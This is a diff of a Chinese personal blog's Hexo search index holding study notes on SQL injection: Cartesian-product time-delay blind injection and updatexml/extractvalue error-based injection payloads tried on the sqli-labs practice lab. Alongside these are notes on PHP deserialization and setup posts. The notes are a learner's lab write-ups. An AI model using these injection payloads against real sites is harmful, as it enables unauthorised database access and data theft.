+<p>以此类推，只要改变条件语句便能得到想要的信息。</p>
 ]]></content>
+      <tags>
+        <tag>sql注入</tag>
+      </tags>
   </entry>
   <entry>
     <title>less8-17</title>
@@ -350,22 +411,6 @@
 ]]></content>
       <tags>
         <tag>sqlilab注入 web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>博客的创建</title>
-    <url>/2024/08/04/%E5%8D%9A%E5%AE%A2%E7%9A%84%E5%88%9B%E5%BB%BA/</url>
-    <content><![CDATA[<p>搭建过程：<br>    先本地连接GitHub，再在GitHub里创建仓库，然后本地安装hexo，最后将hexo程序上传到GitHub。<br>遇到问题：<br>    1. 初始化hexo时弄错了文件夹<br>      解决：找到hexo程序所在文件夹使用git base初始化<br>    2：上传hexo时出现找不到github的邮箱和用户名的问题<br>      解决：网上寻找，在.deploy-git中的子文件.git找到config，并输入你的邮箱与用户名就可以解决<br>    &#x2F;&#x2F;之前出错的截图没了<br>    3：无法插入图片<br>      解决：b站（<a href="https://www.bilibili.com/video/BV1rM411c79A/?spm_id_from=333.337.search-card.all.click&vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1%EF%BC%89">https://www.bilibili.com/video/BV1rM411c79A/?spm_id_from=333.337.search-card.all.click&amp;vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1）</a><br>      在source中创建images文件并将你需要的图片放入然后就可以在md文件中引用图片</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>思科</title>
-    <url>/2024/11/11/%E6%80%9D%E7%A7%91/</url>
-    <content><![CDATA[<h1 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h1><p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20241111161000.jpg" alt="微信图片_20241111161000" loading="lazy"></p>
-<p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20241111160951.jpg" alt="微信图片_20241111160951" loading="lazy"></p>
-]]></content>
-      <tags>
-        <tag>思科模拟器</tag>
       </tags>
   </entry>
   <entry>
@@ -534,80 +579,6 @@
       </tags>
   </entry>
   <entry>
-    <title>笛卡尔积延时注入</title>
-    <url>/2025/01/21/%E7%AC%9B%E5%8D%A1%E5%B0%94%E7%A7%AF%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h1 id="适用情况"><a href="#适用情况" class="headerlink" title="适用情况"></a>适用情况</h1><p>如果一个网站存在基于时间的盲注，而恰好sleep这类核心函数被过滤的话，我们便可以使用。</p>
-<h1 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h1><p><strong>数学表示：</strong></p>
-<ul>
-<li>A &#x3D; {a1, a2, …, am}</li>
-<li>B &#x3D; {b1, b2, …, bn}</li>
-</ul>
-<p>那么笛卡尔积为</p>
-<ul>
-<li>A×B &#x3D; {(a1, b1), (a1, b2), …, (a1, bn), (a2, b1), …, (am, bn)}</li>
-</ul>
-<p><strong>数据库中：</strong></p>
-<p>若执行：</p>
-<p><code>SELECT * FROM TableA, TableB;</code></p>
-<p>TableA:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">| id | name |</span><br><span class="line">|----|------|</span><br><span class="line">| 1  | Alice|</span><br><span class="line">| 2  | Bob  |</span><br></pre></td></tr></table></figure>
-
-<p>TableB:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">| id | age |</span><br><span class="line">|----|-----|</span><br><span class="line">| 1  | 25  |</span><br><span class="line">| 2  | 30  |</span><br></pre></td></tr></table></figure>
-
-<p>执行 <code>SELECT * FROM TableA, TableB;</code> 后的结果将是：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">| TableA.id | TableA.name | TableB.id | TableB.age |</span><br><span class="line">|-----------|-------------|-----------|------------|</span><br><span class="line">| 1         | Alice       | 1         | 25         |</span><br><span class="line">| 1         | Alice       | 2         | 30         |</span><br><span class="line">| 2         | Bob         | 1         | 25         |</span><br><span class="line">| 2         | Bob         | 2         | 30         |</span><br></pre></td></tr></table></figure>
-
-<p>可以看到查询结果是两个表的笛卡尔积。</p>
-<h1 id="利用笛卡尔积进行延时注入"><a href="#利用笛卡尔积进行延时注入" class="headerlink" title="利用笛卡尔积进行延时注入"></a>利用笛卡尔积进行延时注入</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>如果查询的表中含有大量数据，数据库进行计算时需要一段时间，进而产生延时的效果。我们便可以通过是否有延时来判断某个条件是否正确。</p>
-<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p><code>select * from admin where id = 1 and (条件语句) and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</code><br>通过是否有延时效果产生来判断条件语句是否正确。</p>
-<h1 id="自动化脚本编写"><a href="#自动化脚本编写" class="headerlink" title="自动化脚本编写"></a>自动化脚本编写</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>根据是否产生延时(可通过不同个查询结果的笛卡尔积来控制)来判断条件语句是否正确</p>
-<h2 id="基本函数"><a href="#基本函数" class="headerlink" title="基本函数"></a>基本函数</h2><p>**time.time():**它返回自1970年1月1日00:00:00 (UTC) 至当前时间的秒数，这是一个浮点数。这个值通常被称为“Unix时间戳”。可用于计算延时时间。</p>
-<p>**requests.get（url）:**requests.get 是 requests库中的一个函数，用于执行HTTP GET请求</p>
-<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h2><p>这里以sql-lib less5（虽然这题布尔盲注也能做：)   )为例</p>
-<p><strong>爆库名长度</strong></p>
-<p><img src="/../images/1737534128492.jpg" alt="1737534128492" loading="lazy"></p>
-<p>为8</p>
-<p><strong>爆库名</strong></p>
-<p><img src="/../images/1737534277746.jpg" alt="1737534277746" loading="lazy"></p>
-<p><strong>爆表名</strong></p>
-<p><img src="/../images/1737534388694.jpg" alt="1737534388694" loading="lazy"></p>
-<p>以此类推，只要改变条件语句便能得到想要的信息。</p>
-]]></content>
-      <tags>
-        <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>报错注入</title>
-    <url>/2024/12/25/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h1 id="floor报错"><a href="#floor报错" class="headerlink" title="floor报错"></a>floor报错</h1><p>见less7</p>
-<h1 id="updatexml报错"><a href="#updatexml报错" class="headerlink" title="updatexml报错"></a>updatexml报错</h1><p><strong>updatexml‌函数的基本语法：</strong><br>updatexml(xml_document, XPath_string, new_value)</p>
-<p>其中，xml_document是XML文档对象，XPath_string是Xpath路径表达式，new_value是更新后的内容。在报错注入中，我们通常将第一个和第三个参数设置为任意值，重点是通过第二个参数注入不符合Xpath语法的表达式，从而引起数据库报错，并通过错误信息获取数据。</p>
-<h5 id="XPath语法基础"><a href="#XPath语法基础" class="headerlink" title="XPath语法基础"></a>XPath语法基础</h5><p>XPath是一种在XML文档中查找信息的语言，使用路径表达式来选取节点。XPath支持多种节点类型，包括元素、属性、文本、命名空间、处理指令、注释以及文档（根）节点。XPath语法使用<strong>关系运算符（如&#x2F;和&#x2F;&#x2F;）</strong>来连接步骤，描述节点的位置关系‌</p>
-<p><strong>正确使用时：</strong></p>
-<p><code>updatexml(&#39;&lt;h1&gt;hello&lt;/h1&gt;&#39;,&#39;/h1&#39;,&#39;x&#39;)</code></p>
-<p>这个语法的作用是将hello换成了x。</p>
-<p><strong>报错时的使用：</strong></p>
-<p>我们可以通过修改XPath的语句进而构成语法错误。</p>
-<p>例如：<code>updatexml(&#39;hello&#39;,concat(&#39;--&#39;,(select version()),&#39;--&#39;),&#39;x&#39;)</code></p>
-<p>这样就会爆出类似<code>XPATH syntax error : &#39;--5.7.26--&#39;</code>的语句。</p>
-<h1 id="extractvalue报错注入"><a href="#extractvalue报错注入" class="headerlink" title="extractvalue报错注入"></a>extractvalue报错注入</h1><p><strong>extractvalue‌函数的基本语法</strong><br><code>extractvalue(xml_frag, xpath_expr)</code><br>其中，xml_frag是XML片段，xpath_expr是Xpath表达式。在报错注入中，通过提供一个无效的Xpath表达式，导致函数报错，从而获取数据。</p>
-<p><strong>例如</strong></p>
-<p><code>extractvalue(1,concat(0x7e,(select database())))</code></p>
-<p>便会返回数据库名称。</p>
-]]></content>
-      <tags>
-        <tag>sqlilab注入 web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>虚拟机的搭建</title>
-    <url>/2024/08/08/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E6%90%AD%E5%BB%BA/</url>
-    <content><![CDATA[<p>虚拟机搭建<br>  1.首先安装vmware（<a href="https://support.broadcom.com/group/ecx/downloads%EF%BC%89%EF%BC%88%E8%A6%81%E6%B3%A8%E5%86%8C%EF%BC%89%E9%80%89%E6%8B%A9VMware">https://support.broadcom.com/group/ecx/downloads）（要注册）选择VMware</a> workstation pro 17下载<br>  2.再下载Ubuntu22.04（<a href="https://cn.ubuntu.com/download%EF%BC%89">https://cn.ubuntu.com/download）</a><br>  3.在VMware中搭建虚拟机参考（<a href="https://www.bilibili.com/video/BV1pX4y1k7u1/?spm_id_from=333.337.search-card.all.click&vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1%EF%BC%89">https://www.bilibili.com/video/BV1pX4y1k7u1/?spm_id_from=333.337.search-card.all.click&amp;vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1）</a><br>  4.进入虚拟机完成Ubuntu的安装。</p>
-]]></content>
-  </entry>
-  <entry>
     <title>攻防世界</title>
     <url>/2024/12/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
     <content><![CDATA[<h1 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h1><p><strong>概念：</strong></p>
@@ -637,6 +608,35 @@
 <h4 id="1-wakeup-方法漏洞："><a href="#1-wakeup-方法漏洞：" class="headerlink" title="1.__wakeup()方法漏洞："></a>1.__wakeup()方法漏洞：</h4>]]></content>
       <tags>
         <tag>攻防世界</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>虚拟机的搭建</title>
+    <url>/2024/08/08/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E6%90%AD%E5%BB%BA/</url>
+    <content><![CDATA[<p>虚拟机搭建<br>  1.首先安装vmware（<a href="https://support.broadcom.com/group/ecx/downloads%EF%BC%89%EF%BC%88%E8%A6%81%E6%B3%A8%E5%86%8C%EF%BC%89%E9%80%89%E6%8B%A9VMware">https://support.broadcom.com/group/ecx/downloads）（要注册）选择VMware</a> workstation pro 17下载<br>  2.再下载Ubuntu22.04（<a href="https://cn.ubuntu.com/download%EF%BC%89">https://cn.ubuntu.com/download）</a><br>  3.在VMware中搭建虚拟机参考（<a href="https://www.bilibili.com/video/BV1pX4y1k7u1/?spm_id_from=333.337.search-card.all.click&vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1%EF%BC%89">https://www.bilibili.com/video/BV1pX4y1k7u1/?spm_id_from=333.337.search-card.all.click&amp;vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1）</a><br>  4.进入虚拟机完成Ubuntu的安装。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>报错注入</title>
+    <url>/2024/12/25/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="floor报错"><a href="#floor报错" class="headerlink" title="floor报错"></a>floor报错</h1><p>见less7</p>
+<h1 id="updatexml报错"><a href="#updatexml报错" class="headerlink" title="updatexml报错"></a>updatexml报错</h1><p><strong>updatexml‌函数的基本语法：</strong><br>updatexml(xml_document, XPath_string, new_value)</p>
+<p>其中，xml_document是XML文档对象，XPath_string是Xpath路径表达式，new_value是更新后的内容。在报错注入中，我们通常将第一个和第三个参数设置为任意值，重点是通过第二个参数注入不符合Xpath语法的表达式，从而引起数据库报错，并通过错误信息获取数据。</p>
+<h5 id="XPath语法基础"><a href="#XPath语法基础" class="headerlink" title="XPath语法基础"></a>XPath语法基础</h5><p>XPath是一种在XML文档中查找信息的语言，使用路径表达式来选取节点。XPath支持多种节点类型，包括元素、属性、文本、命名空间、处理指令、注释以及文档（根）节点。XPath语法使用<strong>关系运算符（如&#x2F;和&#x2F;&#x2F;）</strong>来连接步骤，描述节点的位置关系‌</p>
+<p><strong>正确使用时：</strong></p>
+<p><code>updatexml(&#39;&lt;h1&gt;hello&lt;/h1&gt;&#39;,&#39;/h1&#39;,&#39;x&#39;)</code></p>
+<p>这个语法的作用是将hello换成了x。</p>
+<p><strong>报错时的使用：</strong></p>
+<p>我们可以通过修改XPath的语句进而构成语法错误。</p>
+<p>例如：<code>updatexml(&#39;hello&#39;,concat(&#39;--&#39;,(select version()),&#39;--&#39;),&#39;x&#39;)</code></p>
+<p>这样就会爆出类似<code>XPATH syntax error : &#39;--5.7.26--&#39;</code>的语句。</p>
+<h1 id="extractvalue报错注入"><a href="#extractvalue报错注入" class="headerlink" title="extractvalue报错注入"></a>extractvalue报错注入</h1><p><strong>extractvalue‌函数的基本语法</strong><br><code>extractvalue(xml_frag, xpath_expr)</code><br>其中，xml_frag是XML片段，xpath_expr是Xpath表达式。在报错注入中，通过提供一个无效的Xpath表达式，导致函数报错，从而获取数据。</p>
+<p><strong>例如</strong></p>
+<p><code>extractvalue(1,concat(0x7e,(select database())))</code></p>
+<p>便会返回数据库名称。</p>
+]]></content>
+      <tags>
+        <tag>sqlilab注入 web</tag>
       </tags>
   </entry>
 </search>
